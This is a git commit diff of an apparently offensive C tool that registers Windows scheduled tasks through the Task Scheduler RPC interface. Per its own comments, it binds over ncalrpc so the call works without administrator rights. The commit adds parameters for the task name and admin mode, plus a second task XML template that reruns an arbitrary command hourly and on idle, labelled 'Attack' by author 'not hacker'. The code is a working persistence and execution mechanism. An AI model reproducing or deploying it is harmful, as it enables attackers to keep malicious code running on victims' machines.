2cb339e10e69120fad9d61a03c1c39a46c44ec51
Loong716 <805757139@qq.com>
2021-11-11 12:03:13 +0800

    add parameter

--- ScheduleTask/ScheduleTask/ScheduleTask.c
+++ ScheduleTask/ScheduleTask/ScheduleTask.c
@@ -10,15 +10,15 @@
 
 void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
 {
-	return((void __RPC_FAR*) malloc(cBytes));
+    return((void __RPC_FAR*) malloc(cBytes));
 }
 
 void __RPC_USER midl_user_free(void __RPC_FAR* p)
 {
-	free(p);
+    free(p);
 }
 
-VOID RegisterSchTask(wchar_t* filePath)
+VOID RegisterSchTask(wchar_t* filePath, wchar_t* schtaskName, BOOL isAdmin)
 {
     RPC_WSTR stringBinding;
     RPC_STATUS rpcStatus;
@@ -29,13 +29,12 @@ VOID RegisterSchTask(wchar_t* filePath)
     RPC_SECURITY_QOS SecurityQOS = { 0 };
     wchar_t xmlBuffer[4096];
 
-    static const wchar_t* xml =
+    static const wchar_t* xml1 =
         L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
         L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
         L"  <RegistrationInfo>\n"
         L"    <Author>not hacker</Author>\n"
         L"    <Description>Attack</Description>\n"
-        L"    <URI>\I am not a hacker</URI>\n"
         L"  </RegistrationInfo>\n"
         L"  <Triggers>\n"
         L"    <RegistrationTrigger>\n"
@@ -92,13 +91,82 @@ VOID RegisterSchTask(wchar_t* filePath)
         L"  </Actions>\n"
         L"</Task>";
 
-    swprintf(xmlBuffer, 4096, xml, filePath);
+    static const wchar_t* xml2 =
+        L"<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n"
+        L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
+        L"  <RegistrationInfo>\n"
+        L"    <Author>not hacker</Author>\n"
+        L"    <Description>Attack</Description>\n"
+        L"  </RegistrationInfo>\n"
+        L"  <Triggers>\n"
+        L"    <RegistrationTrigger>\n"
+        L"      <Repetition>\n"
+        L"        <Interval>PT1H</Interval>\n"
+        L"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
+        L"      </Repetition>\n"
+        L"      <Enabled>true</Enabled>\n"
+        L"    </RegistrationTrigger>\n"
+        L"    <IdleTrigger>\n"
+        L"      <Enabled>true</Enabled>\n"
+        L"    </IdleTrigger>\n"
+        L"    <CalendarTrigger>\n"
+        L"      <Repetition>\n"
+        L"        <Interval>PT1H</Interval>\n"
+        L"        <StopAtDurationEnd>false</StopAtDurationEnd>\n"
+        L"      </Repetition>\n"
+        L"      <StartBoundary>2021-10-11T11:00:00</StartBoundary>\n"
+        L"      <Enabled>true</Enabled>\n"
+        L"      <ScheduleByDay>\n"
+        L"        <DaysInterval>1</DaysInterval>\n"
+        L"      </ScheduleByDay>\n"
+        L"    </CalendarTrigger>\n"
+        L"  </Triggers>\n"
+        L"  <Principals>\n"
+        L"    <Principal id=\"Author\">\n"
+        L"      <RunLevel>LeastPrivilege</RunLevel>\n"
+        L"    </Principal>\n"
+        L"  </Principals>\n"
+        L"  <Settings>\n"
+        L"    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n"
+        L"    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n"
+        L"    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n"
+        L"    <AllowHardTerminate>true</AllowHardTerminate>\n"
+        L"    <StartWhenAvailable>true</StartWhenAvailable>\n"
+        L"    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n"
+        L"    <IdleSettings>\n"
+        L"      <StopOnIdleEnd>true</StopOnIdleEnd>\n"
+        L"      <RestartOnIdle>false</RestartOnIdle>\n"
+        L"    </IdleSettings>\n"
+        L"    <AllowStartOnDemand>true</AllowStartOnDemand>\n"
+        L"    <Enabled>true</Enabled>\n"
+        L"    <Hidden>false</Hidden>\n"
+        L"    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n"
+        L"    <WakeToRun>false</WakeToRun>\n"
+        L"    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n"
+        L"    <Priority>7</Priority>\n"
+        L"  </Settings>\n"
+        L"  <Actions Context=\"Author\">\n"
+        L"    <Exec>\n"
+        L"      <Command>%s</Command>\n"
+        L"    </Exec>\n"
+        L"  </Actions>\n"
+        L"</Task>";
+
+    if (isAdmin)
+    {
+        swprintf(xmlBuffer, 4096, xml1, filePath);
+    }
+    else
+    {
+        swprintf(xmlBuffer, 4096, xml2, filePath);
+    }
+    
 
     // rpcStatus = RpcStringBindingComposeW(ITASKSCHEDULERSERVICE_UUID, L"ncacn_np", L"localhost", L"\\pipe\\atsvc", NULL, &stringBinding);
-    
+
     // change protocol sequence to ncalrpc, this can be called without administrator rights.
     rpcStatus = RpcStringBindingComposeW(ITASKSCHEDULERSERVICE_UUID, L"ncalrpc", NULL, L"", NULL, &stringBinding);
-    
+
     if (rpcStatus == RPC_S_OK)
     {
         rpcStatus = RpcBindingFromStringBindingW(stringBinding, &bindingHandle);
@@ -115,7 +183,7 @@ VOID RegisterSchTask(wchar_t* filePath)
                 RpcTryExcept
                 {
 
-                    status = SchRpcRegisterTask(bindingHandle, L"\\I am not a hacker", xmlBuffer, TASK_CREATE, NULL, 0, 0, NULL, &actualPath, &errorInfo);
+                    status = SchRpcRegisterTask(bindingHandle, schtaskName, xmlBuffer, TASK_CREATE, NULL, 0, 0, NULL, &actualPath, &errorInfo);
                     if (status == S_OK)
                     {
                         wprintf(L"[*] Create schedule task success! ActualPath: %s\n", actualPath);
@@ -143,12 +211,12 @@ VOID RegisterSchTask(wchar_t* filePath)
 
 int wmain(int argc, wchar_t* argv[])
 {
-    if (argc == 2)
+    if (argc == 4)
     {
         wprintf(L"[*] Trying to register a schtask that executes %s.\n", argv[1]);
-        RegisterSchTask(argv[1]);
+        RegisterSchTask(argv[1], argv[2], _wtoi(argv[3]));
     }
-    else wprintf(L"Usage: %s <FilePath>\n", argv[0]);
+    else wprintf(L"Usage: %s <FilePath> <TaskName> <isAdmin>\n", argv[0]);
 
-	return 0;
+    return 0;
 }
